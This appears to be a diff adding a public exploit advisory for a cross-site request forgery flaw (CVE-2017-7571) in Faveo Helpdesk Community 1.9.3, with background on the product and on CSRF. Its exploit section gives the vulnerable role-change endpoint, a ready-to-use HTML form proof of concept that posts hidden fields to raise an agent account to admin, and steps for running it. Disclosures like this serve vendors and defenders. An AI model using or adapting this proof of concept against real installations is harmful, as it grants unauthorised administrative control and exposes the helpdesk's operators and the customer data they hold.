@@ -1,0 +1,60 @@
+# Exploit Title: CSRF / Privilege Escalation (Manipulation of Role Agent to Admin) on Faveo version Community 1.9.3
+# Google Dork: no
+# Date: 05-April-2017
+# Exploit Author: @rungga_reksya, @yokoacc, @AdyWikradinata, @dickysofficial, @dvnrcy
+# Vendor Homepage: http://www.faveohelpdesk.com/
+# Software Link: https://codeload.github.com/ladybirdweb/faveo-helpdesk/zip/v1.9.3
+# Version: Community 1.9.3
+# Tested on: Windows Server 2012 Datacenter Evaluation
+# CVSS 3.0: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (8.3 - HIGH)
+# CVE: 2017-7571
+
+
+I. Background:
+Faveo Helpdesk Open source ticketing system build on Laravel framework. Faveo word is derived from Latin which means to be favourable. Which truly highlights vision and the scope as well as the functionality of the product that Faveo is. It is specifically designed to cater the needs of startups and SME's empowering them with state of art, ticket based support system. In today's competitive startup scenario customer retention is one of the major challenges. Handling client query diligently is all the difference between retaining or losing a long lasting relationship.
+
+II. Description:
+Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. 
+
+Faveo have role:
+- user (Cannot access backend)
+- agent (Can access backend but limited)
+- admin (Can full access backend)
+
+III. Exploit:
+CSRF target is: “/public/rolechangeadmin/USER_ID”
+
+e.g:
+user id = 11 (role is agent)
+
+We have low privilege as “agent” to access application, and we want change to be admin role. 
+- Make sample our script of CSRF (rolechange.html):
+
+<!-- CSRF PoC -->
+<html>
+   <body>
+    <form action="http://example.com/faveo-helpdesk-1.9.3/public/rolechangeadmin/11" method="POST">
+      <input type="hidden" name="group" value="1" />
+      <input type="hidden" name="primary&#95;department" value="3" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+- Before running “rolechange.html”, please login your account as agent and running your html script.
+- Yeaaah, now user id 11 become admin privilege ^_^
+
+
+IV. Thanks to:
+- Alloh SWT
+- MyBoboboy
+- Komunitas IT Auditor & IT Security
+
+
+Refer:
+https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
+https://www.owasp.org/index.php/Testing_for_Privilege_escalation_(OTG-AUTHZ-003)
+
+PoC:
+https://github.com/ladybirdweb/faveo-helpdesk/issues/446
+http://rungga.blogspot.co.id/2017/04/csrf-privilege-escalation-manipulation.html
